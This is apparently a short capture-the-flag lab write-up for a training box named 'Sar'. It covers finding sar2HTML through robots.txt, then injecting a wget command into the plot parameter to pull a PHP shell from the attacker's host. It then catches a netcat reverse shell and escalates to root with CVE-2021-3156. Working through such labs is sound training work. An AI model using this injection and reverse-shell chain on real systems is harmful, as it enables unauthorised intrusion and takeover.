###### tags: `Offsec` `PG Play` `Easy` `Linux` # Sar
```
┌──(kali㉿kali)-[~/pgplay]
...
``` Check`/robots.txt`get `sar2HTML`,Check`http://192.168.211.35/sar2HTML/`get version
```
┌──(kali㉿kali)-[~/pgplay]
└─$ curl 192.168.211.35/robots.txt                                            
sar2HTML
``` ![Sar_1.png](picture/Sar_1.png) find [edb-47204](https://www.exploit-db.com/exploits/47204),download`shell.php`,Start ncwait for reverse shell ```
┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp9001

192.168.211.35/sar2HTML/index.php?plot=;wget 192.168.45.202/shell.php
192.168.211.35/sar2HTML/shell.php
``` can in `/home`find local.txt
```
www-data@sar:/home$ cat local.txt
13462e9ab7336b466ca015fe44d600ac
``` `linpeas.sh`,Try[CVE-2021-3156](https://github.com/worawit/CVE-2021-3156?tab=readme-ov-file)
```
...
``` get root,in /rootcan get proof.txt
```
